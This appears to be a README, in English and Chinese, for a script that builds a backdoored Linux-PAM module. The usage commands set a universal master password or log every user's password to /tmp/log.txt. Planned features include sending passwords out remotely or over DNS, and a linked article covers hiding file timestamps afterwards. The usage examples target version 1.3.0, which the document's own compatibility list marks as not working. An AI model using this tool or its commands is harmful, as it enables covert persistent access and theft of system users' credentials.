# linux-pam-backdoor         
Linux PAM Backdoor           
                             
This script automates the creation of a backdoor for Linux-PAM (Pluggable Authentication Modules)

Modify by 9bie.

## TODO
 - ~添加密码记录(已完成)~
 - 添加发送远程密码
 - 添加使用dns协议发送密码

## Tips
遇到undefine yywrap等问题，使用`sudo apt-get install flex` 即可

替换之后修改时间的后渗透操作可以去[一般路过PAM后门 / SSH密码记录](https://9bie.org/index.php/archives/742/) 查看

## Usage

如果你需要万能密码
```
./backdoor.sh -m key -v 1.3.0 -p som3_s3cr4t_p455w0rd
```
其中p为你要的万能密码


如果你需要使用密码记录
```
./backdoor.sh -m save -v 1.3.0 -o /tmp/log.txt
```
其中o为密码保存路径
## Dependencies 


* 1.1.8 and older: 它工作
* 1.2.0: 它工作
* 1.3.0 to 1.4.0: 不工作

The following packages where used
```bash
apt install -y  autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev libselinux1-dev libtool libcrypt-dev libxml2-utils make pkg-config sed w3m xsltproc xz-utils gcc
```
